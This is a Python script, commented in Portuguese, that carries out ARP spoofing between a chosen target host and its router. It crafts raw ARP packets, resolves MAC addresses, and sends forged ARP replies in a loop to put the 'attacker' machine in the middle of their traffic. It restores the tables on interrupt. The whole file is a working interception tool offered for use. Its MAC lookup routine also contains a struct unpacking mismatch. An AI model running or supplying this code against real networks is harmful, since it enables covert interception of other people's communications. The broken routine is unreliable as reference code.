import socket
import struct
import time

def criar_pacote_arp(src_mac, src_ip, dst_mac, dst_ip, opcode):
    """Cria um pacote ARP Ethernet com o opcode especificado."""
    eth_header = struct.pack(
        "!6s6sH",
        bytes.fromhex(dst_mac.replace(":", "")),  # MAC de destino
        bytes.fromhex(src_mac.replace(":", "")),  # MAC de origem
        0x0806,  # EtherType ARP
    )
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,  # Tipo de hardware (Ethernet)
        0x0800,  # Protocolo (IPv4)
        6,  # Tamanho do endereço MAC
        4,  # Tamanho do endereço IP
        opcode,  # Opcode (1 para request, 2 para reply)
        bytes.fromhex(src_mac.replace(":", "")),  # MAC do remetente
        socket.inet_aton(src_ip),  # IP do remetente
        bytes.fromhex(dst_mac.replace(":", "")),  # MAC do destino
        socket.inet_aton(dst_ip),  # IP do destino
    )
    return eth_header + arp_header

def obter_mac(interface, ip):
    """Obtém o endereço MAC para um IP enviando uma solicitação ARP."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind((interface, 0))
    mac_broadcast = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC
    src_mac = obter_mac_local(interface)

    # Criar pacote ARP request
    arp_request = criar_pacote_arp(src_mac, "0.0.0.0", mac_broadcast, ip, 1)
    s.send(arp_request)

    while True:
        packet = s.recvfrom(65535)[0]
        eth_type = struct.unpack("!H", packet[12:14])[0]

        if eth_type == 0x0806:  # ARP
            arp_data = packet[14:42]
            _, _, _, _, sender_mac, sender_ip = struct.unpack("!HHBBH6s4s", arp_data)
            if socket.inet_ntoa(sender_ip) == ip:
                return ":".join("{:02x}".format(b) for b in sender_mac)

def obter_mac_local(interface):
    """Obtém o endereço MAC da interface local do atacante."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
    local_mac = s.getsockname()[4]
    return ":".join("{:02x}".format(byte) for byte in local_mac)

def arp_spoof(interface, alvo_ip, roteador_ip):
    """Executa ARP Spoofing entre o alvo e o roteador."""
    print("[INFO] Obtendo endereços MAC...")
    alvo_mac = obter_mac(interface, alvo_ip)
    roteador_mac = obter_mac(interface, roteador_ip)
    atacante_mac = obter_mac_local(interface)

    print(f"[INFO] Atacante MAC: {atacante_mac}")
    print(f"[INFO] Alvo IP: {alvo_ip}, MAC: {alvo_mac}")
    print(f"[INFO] Roteador IP: {roteador_ip}, MAC: {roteador_mac}")

    # Pacotes para enviar
    pacote_para_alvo = criar_pacote_arp(atacante_mac, roteador_ip, alvo_mac, alvo_ip, 2)
    pacote_para_roteador = criar_pacote_arp(atacante_mac, alvo_ip, roteador_mac, roteador_ip, 2)

    try:
        print("[INFO] Enviando pacotes ARP...")
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interface, 0))
        while True:
            s.send(pacote_para_alvo)
            s.send(pacote_para_roteador)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[INFO] Restaurando tabelas ARP...")
        restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac)

def restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac):
    """Restaura as tabelas ARP ao estado original."""
    atacante_mac = obter_mac_local(interface)
    pacote_para_alvo = criar_pacote_arp(roteador_mac, roteador_ip, alvo_mac, alvo_ip, 2)
    pacote_para_roteador = criar_pacote_arp(alvo_mac, alvo_ip, roteador_mac, roteador_ip, 2)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
    for _ in range(5):
        s.send(pacote_para_alvo)
        s.send(pacote_para_roteador)
        time.sleep(1)

    print("[INFO] Tabelas ARP restauradas.")
